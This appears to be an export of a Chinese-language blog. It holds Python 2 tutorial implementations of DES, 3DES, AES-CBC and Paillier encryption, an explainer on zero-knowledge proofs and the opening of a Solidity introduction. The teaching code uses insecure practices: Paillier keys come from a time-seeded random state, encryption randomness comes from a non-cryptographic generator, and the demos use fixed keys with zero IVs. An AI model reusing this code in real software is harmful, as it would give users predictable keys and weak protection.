4, 26, 8, 16, 7, 27, 20, 13, 2, 41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48, 44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32]# 明文扩展置换表（32bit-&gt;48bit）E = [32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9, 10, 11, 12, 13, 12, 13, 14, 15, 16, 17, 16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25, 24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1]# 子密钥循环左移位数表（16次）SHIFT = [1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1]sub_keys = [[0] * 48] * 16def convert_string_to_bitlist(string): data = [ord(c) for c in string] l = len(data) * 8 result = [0] * l pos = 0 for ch in data: i = 7 while i &gt;= 0: if ch &amp; (1 &lt;&lt; i) != 0: result[pos] = 1 else: result[pos] = 0 pos += 1 i -= 1 return resultdef convert_bitlist_to_string(bitlist): result = [] pos = 0 c = 0 while pos &lt; len(bitlist): c += bitlist[pos] &lt;&lt; (7 - pos % 8) if pos % 8 == 7: result.append(c) c = 0 pos += 1 return ''.join([chr(c) for c in result])def permute(table, block): return list(map(lambda x: block[x - 1], table))def create_sub_keys(key): key = permute(PC_1, convert_string_to_bitlist(key)) i = 0 lkey = key[:28] rkey = key[28:] while i &lt; 16: j = 0 while j &lt; SHIFT[i]: lkey.append(lkey[0]) del lkey[0] rkey.append(rkey[0]) del rkey[0] j += 1 sub_keys[i] = permute(PC_2, lkey + rkey) # print sub_keys[i] i += 1def des_cipher(block, choice): block = permute(IP, block) lblock = block[:32] rblock = block[32:] if choice == ENCRYPT: iteration = 0 iteration_adjustment = 1 elif choice == DECRYPT: iteration = 15 iteration_adjustment = -1 i = 0 # 16轮F函数 while i &lt; 16: rtemp = rblock[:] # 将右半块32位扩展为48位 rblock = permute(E, rblock) # 将扩展后的右半块和轮密钥进行逐位异或 rblock = list(map(lambda x, y: x ^ y, rblock, sub_keys[iteration])) b = [rblock[:6], rblock[6:12], rblock[12:18], rblock[18:24], rblock[24:30], rblock[30:36], rblock[36:42], rblock[42:]] j = 0 bn = [0] * 32 pos = 0 # S盒置换 while j &lt; 8: row = (b[j][0] &lt;&lt; 1) + b[j][5] col = (b[j][1] &lt;&lt; 3) + (b[j][2] &lt;&lt; 2) + (b[j][3] &lt;&lt; 1) + b[j][4] v = S[j][(16 * row) + col] bn[pos] = (v &amp; 8) &gt;&gt; 3 bn[pos + 1] = (v &amp; 4) &gt;&gt; 2 bn[pos + 2] = (v &amp; 2) &gt;&gt; 1 bn[pos + 3] = v &amp; 1 pos += 4 j += 1 # 与P盒进行置换 rblock = permute(P, bn) rblock = list(map(lambda x, y: x ^ y, rblock, lblock)) lblock = rtemp i += 1 iteration += iteration_adjustment final = permute(IP_, rblock + lblock) return finaldef cipher(data, key, iv, choice): if len(data) % BLOCK_SIZE != 0: raise ValueError(\"Data length illegal.\") if len(key) != 8 or len(iv) != 8: raise ValueError(\"key/iv\\'s length should be 8.\") create_sub_keys(key) iv = convert_string_to_bitlist(iv) i = 0 result = [] while i &lt; len(data): block = convert_string_to_bitlist(data[i:i + 8]) if choice == ENCRYPT: block = list(map(lambda x, y: x ^ y, block, iv)) block = des_cipher(block, choice) iv = block elif choice == DECRYPT: temp = block[:] block = des_cipher(block, choice) block = list(map(lambda x, y: x ^ y, block, iv)) iv = temp result.append(convert_bitlist_to_string(block)) i += 8 return ''.join(result)if __name__ == '__main__': key = '#qianfei' iv = '0' * 8 data = '#qianfei11111111' ciphertext = cipher(data, key, iv, ENCRYPT) # print [ord(c) for c in ciphertext] print ciphertext plaintext = cipher(ciphertext, key, iv, DECRYPT) # print [ord(c) for c in plaintext] print plaintext 3DES密码学中，三重数据加密算法（英语：Triple Data Encryption Algorithm，缩写为 TDEA，Triple DEA），或称 3DES（Triple DES），是一种对称密钥加密块密码，相当于是对每个数据块应用三次数据加密标准（DES）算法。由于计算机运算能力的增强，原版 DES 密码的密钥长度变得容易被暴力破解；3DES 即是设计用来提供一种相对简单的方法，即通过增加 DES 的密钥长度来避免类似的攻击，而不是设计一种全新的块密码算法。 算法流程三重 DES 的本质上就是经过了三次 DES 操作，密钥长度为 24 字节，拆分为三个长为 8 字节的密钥，加密时依次对明文进行加密、解密、加密的操作，解密时相反。具体如下： $$Ciphertext = E_{K3}(D_{K2}(E_{K1}(Plaintext))) \\Plaintext = D_{K1}(E_{K2}(D_{K3}(Ciphertext)))$$ 算法实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566...def triple_encipher(data, masterKey, iv): if len(masterKey) == 8: key1 = masterKey[:8] key2 = masterKey[:8] key3 = masterKey[:8] elif len(masterKey) == 16: key1 = masterKey[:8] key2 = masterKey[8:16] key3 = masterKey[:8] else: key1 = masterKey[:8] key2 = masterKey[8:16] key3 = masterKey[16:24] keys = [key1, key2, key3] # print keys i = 0 result = [] while i &lt; len(data): block = cipher(data[i:i + 8], keys[0], iv, ENCRYPT) block = cipher(block, keys[1], iv, DECRYPT) block = cipher(block, keys[2], iv, ENCRYPT) iv = block result.append(block) i += 8 return ''.join(result).encode('base64')def triple_decipher(data, masterKey, iv): if len(masterKey) == 8: key1 = masterKey[:8] key2 = masterKey[:8] key3 = masterKey[:8] elif len(masterKey) == 16: key1 = masterKey[:8] key2 = masterKey[8:16] key3 = masterKey[:8] else: key1 = masterKey[:8] key2 = masterKey[8:16] key3 = masterKey[16:24] keys = [key1, key2, key3] # print keys i = 0 result = [] data = data.decode('base64') while i &lt; len(data): temp = data[i:i + 8] block = cipher(data[i:i + 8], keys[2], iv, DECRYPT) block = cipher(block, keys[1], iv, ENCRYPT) block = cipher(block, keys[0], iv, DECRYPT) iv = temp result.append(block) i += 8 return ''.join(result)if __name__ == '__main__': key = '#qianfei' iv = '0' * 8 data = '#qianfei11111111' ciphertext = triple_encipher(data, key, iv) # print [ord(c) for c in ciphertext] print ciphertext plaintext = triple_decipher(ciphertext, key, iv) # print [ord(c) for c in plaintext] print plaintext AES高级加密标准（英语：Advanced Encryption Standard，缩写：AES），在密码学中又称 Rijndael 加密法，是美国联邦政府采用的一种区块加密标准。这个标准用来替代原先的 DES，已经被多方分析且广为全世界所使用。经过五年的甄选流程，高级加密标准由美国国家标准与技术研究院（NIST）于 2001 年 11 月 26 日发布于 FIPS PUB 197，并在 2002 年 5 月 26 日成为有效的标准。2006 年，高级加密标准已然成为对称密钥加密中最流行的算法之一。 算法流程严格地说，AES 和 Rijndael 加密法并不完全一样（虽然在实际应用中两者可以互换），因为 Rijndael 加密法可以支持更大范围的区块和密钥长度：AES 的区块长度固定为 128 比特，密钥长度则可以是 128，192 或 256 比特；而 Rijndael 使用的密钥和区块长度均可以是 128，192 或 256 比特。加密过程中使用的密钥是由 Rijndael 密钥生成方案产生。 AES 密钥长度（32 位比特字) 分组长度(32 位比特字) 加密轮数 AES-128 4 4 10 AES-192 6 4 12 AES-256 8 4 14 大多数 AES 计算是在一个特别的有限域完成的。AES 加密过程是在一个 4×4 的字节矩阵上运作，这个矩阵又称为“体（state）”，其初值就是一个明文区块（矩阵中一个元素大小就是明文区块中的一个 Byte）。（Rijndael 加密法因支持更大的区块，其矩阵的“列数（Row number）”可视情况增加）加密时，各轮 AES 加密循环（除最后一轮外）均包含 4 个步骤： 轮密钥加：矩阵中的每一个字节都与该次回合密钥做 XOR 运算；每个子密钥由密钥生成方案产生。 字节代换：透过一个非线性的替换函数，用查找表的方式把每个字节替换成对应的字节。 行位移：将矩阵中的每个横列进行循环式移位。 列混合：为了充分混合矩阵中各个直行的操作。这个步骤使用线性转换来混合每内联的四个字节。最后一个加密循环中省略 MixColumns 步骤，而以另一个轮密钥取代。 轮密钥加轮密钥加中，密钥将会与原矩阵合并。在每次的加密循环中，都会由主密钥产生一把回合密钥（透过 Rijndael 密钥生成方案产生），这把密钥大小会跟原矩阵一样，以与原矩阵中每个对应的字节作异或（⊕）加法。 字节代换在字节代换步骤中，矩阵中的各字节透过一个 8 位的 S-box 进行转换。这个步骤提供了加密法非线性的变换能力。S-box 与 $GF(2^{8})$ 上的乘法反元素有关，已知具有良好的非线性特性。为了避免简单代数性质的攻击，S-box 结合了乘法反元素及一个可逆的仿射变换矩阵建构而成。此外在建构 S-box 时，刻意避开了固定点与反固定点，即以 S-box 替换字节的结果会相当于错排的结果。 ShiftRows行位移描述矩阵的列操作。在此步骤中，每一列都向左循环位移某个偏移量。在 AES 中（区块大小 128 位），第一列维持不变，第二列里的每个字节都向左循环移动一格。同理，第三列及第四列向左循环位移的偏移量就分别是 2 和 3。128 位和 192 比特的区块在此步骤的循环位移的模式相同。经过行位移之后，矩阵中每一竖行，都是由输入矩阵中的每个不同行中的元素组成。Rijndael 算法的版本中，偏移量和 AES 有少许不同；对于长度 256 比特的区块，第一列仍然维持不变，第二列、第三列、第四列的偏移量分别是 1 字节、2 字节、3 字节。除此之外，行位移操作步骤在 Rijndael 和 AES 中完全相同。 列混合在列混合步骤，每一行的四个字节透过线性变换互相结合。每一行的四个元素分别当作$1, x, x^2, x^3$ 的系数，合并即为 $GF(2^{8})$ 中的一个多项式，接着将此多项式和一个固定的多项式 $c(x)=3x^{3}+x^{2}+x+2$ 在模 $x^4+1$ 下相乘。此步骤亦可视为 Rijndael 有限域之下的矩阵乘法。列混合函数接受 4 个字节的输入，输出 4 个字节，每一个输入的字节都会对输出的四个字节造成影响。因此行位移和列混合两步骤为这个密码系统提供了扩散性。 算法实现这里实现了采用 CBC 模式且密钥长度为 128 位的 AES 算法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186#!/usr/bin/env python# -*- encoding=utf-8 -*-ENCRYPT = 0DECRYPT = 1BLOCK_SIZE = 16S = [0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16]S_ = [0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb, 0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb, 0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e, 0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25, 0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92, 0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84, 0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06, 0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b, 0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73, 0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e, 0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b, 0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4, 0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f, 0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef, 0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d]Rcon = [ 0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36, 0x6C, 0xD8, 0xAB, 0x4D, 0x9A, 0x2F, 0x5E, 0xBC, 0x63, 0xC6, 0x97, 0x35, 0x6A, 0xD4, 0xB3, 0x7D, 0xFA, 0xEF, 0xC5, 0x91, 0x39,]round_keys = [[0] * 4] * 44def xtime(a): return (((a &lt;&lt; 1) ^ 0x1B) &amp; 0xFF) if (a &amp; 0x80) else (a &lt;&lt; 1)def convert_string_to_matrix(string): matrix = [] for i in range(16): byte = ord(string[i]) if i % 4 == 0: matrix.append([byte]) else: matrix[i / 4].append(byte) return matrixdef convert_matrix_to_string(matrix): string = '' for i in range(4): for j in range(4): string += chr(matrix[i][j]) return stringdef generate_round_keys(master_key): round_keys[:4] = convert_string_to_matrix(master_key) # print round_keys for i in range(4, 4 * 11): temp = [] if i % 4 == 0: # print round_keys[i - 4][0] # print round_keys[i - 1][0] # print Rcon[i/4] byte = round_keys[i - 4][0] ^ S[round_keys[i - 1][1]] ^ Rcon[i / 4] # print i, byte temp.append(byte) for j in range(1, 4): byte = round_keys[i - 4][j] ^ S[round_keys[i - 1][(j + 1) % 4]] # print byte temp.append(byte) else: for j in range(4): byte = round_keys[i - 4][j] ^ round_keys[i - 1][j] temp.append(byte) round_keys[i] = temp # print round_keysdef add_round_key(matrix, round_key): for i in range(4): for j in range(4): matrix[i][j] ^= round_key[i][j] return matrixdef sub_bytes(matrix, table): for i in range(4): for j in range(4): matrix[i][j] = table[matrix[i][j]] return matrixdef shift_single_row(matrix, line, n): i = 0 while i &lt; n: temp = matrix[0][line] for j in range(3): matrix[j][line] = matrix[j + 1][line] matrix[3][line] = temp i += 1 return matrixdef shift_rows(matrix, inversed=False): if inversed == True: matrix = shift_single_row(matrix, 1, 3) matrix = shift_single_row(matrix, 2, 2) matrix = shift_single_row(matrix, 3, 1) else: matrix = shift_single_row(matrix, 1, 1) matrix = shift_single_row(matrix, 2, 2) matrix = shift_single_row(matrix, 3, 3) return matrixdef mix_single_column(matrix): t = 0 for i in range(4): t ^= matrix[i] # print 'x =&gt;', t temp = matrix[0] for i in range(3): matrix[i] ^= t ^ xtime(matrix[i] ^ matrix[i + 1]) matrix[3] ^= t ^ xtime(matrix[3] ^ temp) return matrixdef mix_columns(matrix, inversed=False): if inversed == True: for i in range(4): u = xtime(xtime(matrix[i][0] ^ matrix[i][2])) v = xtime(xtime(matrix[i][1] ^ matrix[i][3])) matrix[i][0] ^= u matrix[i][1] ^= v matrix[i][2] ^= u matrix[i][3] ^= v matrix = mix_columns(matrix) else: for i in range(4): # print 'm =&gt;', matrix[i] matrix[i] = mix_single_column(matrix[i]) return matrixdef aes_cipher(block, rounds, choice): if len(block) != 16: raise ValueError(\"Block\\'s length must be 16.\") matrix = convert_string_to_matrix(block) if choice == ENCRYPT: matrix = add_round_key(matrix, round_keys[:4]) i = 1 while i &lt; rounds: matrix = sub_bytes(matrix, S) matrix = shift_rows(matrix) matrix = mix_columns(matrix) matrix = add_round_key(matrix, round_keys[4 * i:4 * i + 4]) i += 1 matrix = sub_bytes(matrix, S) matrix = shift_rows(matrix) matrix = add_round_key(matrix, round_keys[40:]) elif choice == DECRYPT: matrix = add_round_key(matrix, round_keys[40:]) matrix = shift_rows(matrix, inversed=True) matrix = sub_bytes(matrix, S_) i = rounds - 1 while i &gt; 0: matrix = add_round_key(matrix, round_keys[4 * i:4 * i + 4]) matrix = mix_columns(matrix, inversed=True) matrix = shift_rows(matrix, inversed=True) matrix = sub_bytes(matrix, S_) i -= 1 matrix = add_round_key(matrix, round_keys[:4]) return convert_matrix_to_string(matrix)def cipher(data, key, iv, rounds, choice): if len(data) % BLOCK_SIZE != 0: raise ValueError(\"Data length illegal.\") if len(key) != 16 or len(iv) != 16: raise ValueError(\"key/iv\\'s length should be 16.\") generate_round_keys(key) i = 0 result = [] while i &lt; len(data): block = data[i:i + 16] if choice == ENCRYPT: block = list(map(lambda x, y: ord(x) ^ ord(y), block, iv)) block = ''.join([chr(c) for c in block]) block = aes_cipher(block, rounds, choice) iv = block elif choice == DECRYPT: temp = block[:] block = aes_cipher(block, rounds, choice) block = list(map(lambda x, y: ord(x) ^ ord(y), block, iv)) block = ''.join([chr(c) for c in block]) iv = temp result.append(block) i += BLOCK_SIZE return ''.join(result)if __name__ == '__main__': key = '#qianfei12345678' iv = '0' * 16 ciphertext = cipher('#qianfei12345678', key, iv, 10, ENCRYPT) print ciphertext plaintext = cipher(ciphertext, key, iv, 10, DECRYPT) print plaintext Referenceshttps://en.wikipedia.org/wiki/Data_Encryption_Standardhttps://en.wikipedia.org/wiki/Advanced_Encryption_Standardhttps://csrc.nist.gov/csrc/media/publications/fips/46/3/archive/1999-10-25/documents/fips46-3.pdfhttps://blog.csdn.net/Apollon_krj/article/details/76124722https://github.com/twhiteman/pyDes/blob/master/pyDes.pyhttps://en.wikipedia.org/wiki/Triple_DEShttp://blog.niuhemoon.xyz/pages/2018/05/18/Python-Symmetric-encryption/https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.197.pdfhttps://www.cxyxiaowu.com/3239.html","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"qianfei11.coding.me/tags/crypto/"},{"name":"python","slug":"python","permalink":"qianfei11.coding.me/tags/python/"}]},{"title":"Python实现Paillier加密解密算法","slug":"Python实现Paillier加密解密算法","date":"2019-10-24T03:49:26.000Z","updated":"2019-10-25T10:57:15.763Z","comments":true,"path":"2019/10/24/Python实现Paillier加密解密算法/","link":"","permalink":"qianfei11.coding.me/2019/10/24/Python实现Paillier加密解密算法/","excerpt":"Paillier 加密系统，是 1999 年 Paillier 发明的概率公钥加密系统。基于复合剩余类的困难问题。该加密算法是一种同态加密，满足加法和数乘同态。","text":"Paillier 加密系统，是 1999 年 Paillier 发明的概率公钥加密系统。基于复合剩余类的困难问题。该加密算法是一种同态加密，满足加法和数乘同态。 IntroductionKeygen首先选择两个大素数 $p$ 和 $q$，计算出 $n$ 为 $p$ 和 $q$ 的乘积。并取一个随机数 $g$（通常取 $n+1$）。$n$ 和 $g$ 作为公钥。 然后根据卡迈克尔函数计算私钥 $\\lambda$ 为 $p-1$ 和 $q-1$ 的乘积。 Encipher加密时取一个随机数 $r$，计算出 $c \\equiv g^m r^n(mod\\ n^2)$。 Decipher解密有一点复杂。首先我们可以得到： $$c^\\lambda \\equiv (g^m r^n)^\\lambda \\equiv g^{m \\lambda} r^{n \\lambda}(mod\\ n^2)$$ 根据卡迈克尔函数，即对于任何 $\\omega \\in Z^*_{n^2}$，必定存在以下结论： $$\\omega^{n \\lambda} \\equiv 1(mod\\ n^2)$$ 那么可以得到 $c^\\lambda \\equiv g^{m \\lambda}(mod\\ n^2)$。 然后看看生成元 $g$，实际上是通过 $g=(1+\\alpha n)\\beta^n$ 得到的，并且 $\\alpha,\\beta \\in Z^*_n$。由此可得： $$c^\\lambda \\equiv (1+\\alpha n)^{m \\lambda}\\beta^{n m \\lambda} \\equiv (1+\\alpha n)^{m \\lambda}(mod\\ n^2)$$ 再根据公式 $(1+n)^x \\equiv 1+xn(mod\\ n^2)$，可以得到： $$c^\\lambda \\equiv (1+n)^{\\alpha m \\lambda} \\equiv 1+n \\alpha m \\lambda(mod\\ n^2)$$ 然后我们在此处定义一个函数 $L(x)=\\frac{x-1}{n}$，则 $L(c^\\lambda)=\\alpha m \\lambda$。 那么我们可以得到明文的计算公式为 $m \\equiv \\frac{L(c^\\lambda)}{L(g^\\lambda)} \\equiv \\frac{\\alpha m \\lambda}{\\alpha \\lambda} \\equiv m(mod\\ n)$。 Getting started通过 gmpy2 和 libnum 库实现。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#!/usr/bin/env pythonimport gmpy2import randomimport timeimport libnumdef get_prime(rs): p = gmpy2.mpz_urandomb(rs, 1024) while not gmpy2.is_prime(p): p = p + 1 return pdef L(x, n): return (x - 1) / ndef keygen(): rs = gmpy2.random_state(int(time.time())) p = get_prime(rs) q = get_prime(rs) n = p * q lmd = (p - 1) * (q - 1) #g = random.randint(1, n ** 2) g = n + 1 if gmpy2.gcd(L(gmpy2.powmod(g, lmd, n ** 2), n), n) != 1: print '[!] g is not good enough' exit() pk = [n, g] sk = lmd return pk, skdef encipher(plaintext, pk): m = libnum.s2n(plaintext) n, g = pk r = random.randint(1, n ** 2) c = gmpy2.powmod(g, m, n ** 2) * gmpy2.powmod(r, n, n ** 2) % (n ** 2) return cdef decipher(c, pk, sk): [n, g] = pk lmd = sk u = gmpy2.invert(L(gmpy2.powmod(g, lmd, n ** 2), n), n) % n m = L(gmpy2.powmod(c, lmd, n ** 2), n) * u % n plaintext = libnum.n2s(m) return plaintextif __name__ == '__main__': pk, sk = keygen() #print 'pk:', pk #print 'sk:', sk plaintext = raw_input('Please input your message: ') ciphertext = encipher(plaintext, pk) print 'Ciphertext:', ciphertext plaintext = decipher(ciphertext, pk, sk) print 'Plaintext:', plaintext ReferencesThe Paillier Cryptosystem卡迈克尔函数","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"qianfei11.coding.me/tags/crypto/"},{"name":"python","slug":"python","permalink":"qianfei11.coding.me/tags/python/"}]},{"title":"何为零知识证明","slug":"何为零知识证明","date":"2019-09-29T11:28:12.000Z","updated":"2019-10-04T10:33:07.438Z","comments":true,"path":"2019/09/29/何为零知识证明/","link":"","permalink":"qianfei11.coding.me/2019/09/29/何为零知识证明/","excerpt":"何为零知识证明？","text":"何为零知识证明？ 零知识证明，指的是示证者向验证者表明他知道某种秘密，不仅能使验证者完全确信他的确知道这个秘密，同时还保证一丁点秘密也不泄露给验证者。 童话里的零知识证明举个最简单的阿拉伯童话《一千零一夜》里的零知识证明：阿里巴巴与四十大盗的故事其中一个片段。 阿里巴巴会芝麻开门的咒语，强盗向他拷问打开山洞石门的咒语，他不想让人听到咒语，便对强盗说：「你们离我一箭之地，用弓箭指着我，你们举起右手，我念咒语打开石门，举起左手，我念咒语关上石门，如果我做不到或逃跑，你们就用弓箭射死我。」 这个方案对阿里巴巴没损失，也能帮助他们搞清楚阿里巴巴到底是否知道咒语，于是强盗们同意。强盗举起了右手，只见阿里巴巴的嘴动了几下，石门打开了；强盗举起了左手，阿里巴巴的嘴动了几下，石门又关上了。强盗有点不信，没准这是巧合，多试几次过后，他们相信了阿里巴巴。 零知识证明的优点 在使用零知识证明的时候，不降低安全性。 零知识证明工作高效，计算过程量小，双方交换信息少。 既安全、又有良好的隐私、又减少计算量。 零知识证明的性质根据零知识证明的定义和有关例子，可以得出零知识证明具有以下三个性质： 完备性（completeness）：如果证明方和验证方都是诚实的，并遵循证明过程的每一步，进行正确的计算，那么这个证明一定是成功的，验证方一定能够接受证明方。 合理性（soundness）：没有人能够假冒证明方，使这个证明成功。 零知识性（zero-knowledge）：证明过程执行完之后，验证方只获得了「证明方拥有这个知识」的信息，而没有获得关于这个知识本身的任何信息。 零知识证明的优点 随着零知识证明的使用，安全性不会降级，因为该证明具有零知识性质。 高效性。该过程计算量小，双方交换的信息量少。 安全性依赖于未解决的数学难题，如离散对数、大整数因子分解、平方根等。 许多零知识证明相关的技术避免了直接使用有政府限制的加密算法，为相关产品的出口带去优势。 证明举例例 1：A 要向 B 证明自己拥有某个房间的钥匙，假设该房间只能用钥匙打开锁，而其他任何方法都打不开。有两个方法： A 把钥匙出示给 B，B 用这把钥匙打开该房间的锁，从而证明 A 拥有该房间的正确的钥匙。 B 确定该房间内有某一物体，A 用自己拥有的钥匙打开该房间的门，然后把物体拿出来出示给 B，从而证明自己确实拥有该房间的钥匙。 后面的方法 2 属于零知识证明。好处在于在整个证明的过程中，B 始终不能看到钥匙的样子，从而避免了钥匙的泄露。 例 2：A 拥有 B 的公钥，A 没有见过 B，而 B 见过 A 的照片，某天二人偶然碰面，B 认出了 A，但 A 不能确定面前的人是否是 B，这时 B 要向 A 证明自己是 B，也有两个方法： B 把自己的私钥给 A，A 用这个私钥对某个数据加密，然后用 B 的公钥解密，如果正确，则证明对方确实是 B。 A 给出一个随机值，B 用自己的私钥对其加密，然后把加密后的数据交给 A，A 用 B 的公钥解密，如果能够得到原来的随机值，则证明对方是 B。 后面的方法属于零知识证明。 有一个缺口环形的长廊，出口和入口距离非常近（在目距之内），但走廊中间某处有一道只能用钥匙打开的门，A 要向 B 证明自己拥有该门的钥匙。采用零知识证明，则 B 看着 A 从入口进入走廊，然后又从出口走出走廊，这时 B 没有得到任何关于这个钥匙的信息，但是完全可以证明 A 拥有钥匙。 零知识证明一般的过程假设有两方人，甲方是证明者，乙方是验证者。他们在一个工作环境内有相同的一组函数和一组数值。证明开始： 甲方先发送满足条件的随机值给乙方，这个称为承诺。 乙方发送满足条件的随机值给甲方，这个称为挑战。 甲方执行一个不让乙方知道的计算，并把计算结果给乙方，这个称为响应。 乙方对响应进行验证，验证失败就退出，验证成功回到 1，然后继续顺序执行 n 次。 如果每一次乙方验证都是成功的，那么乙方就相信了和甲方之间的共识。在整个过程中没有透露任何相关秘密信息。 Referenceshttps://www.jianshu.com/p/3f524c925c34https://blog.csdn.net/liudongdong19/article/details/82884742","categories":[],"tags":[{"name":"blockchain","slug":"blockchain","permalink":"qianfei11.coding.me/tags/blockchain/"}]},{"title":"智能合约入门","slug":"智能合约入门","date":"2019-09-22T11:58:53.000Z","updated":"2019-10-03T13:18:14.322Z","comments":true,"path":"2019/09/22/智能合约入门/","link":"","permalink":"qianfei11.coding.me/2019/09/22/智能合约入门/","excerpt":"参考 Solidity 0.5.9 中文文档。","text":"参考 Solidity 0.5.9 中文文档。 Environment Ubuntu 16.04.6 IntroSolidity 是一种智能合约的高级语言，运行在 Ethereum 虚拟机（EVM）之上。它的语法接近于 JavaScript，是一种面向对象的语言。但作为一种真正意义上运行在网络上的去中心合约，它又有很多的不同，下面列举一些： 以太坊底层是基于账户，而非 UTXO 的，所以有一个特殊的 Address 的类型。用于定位用户，定位合约，定位合约的代码（合约本身也是一个账户）。 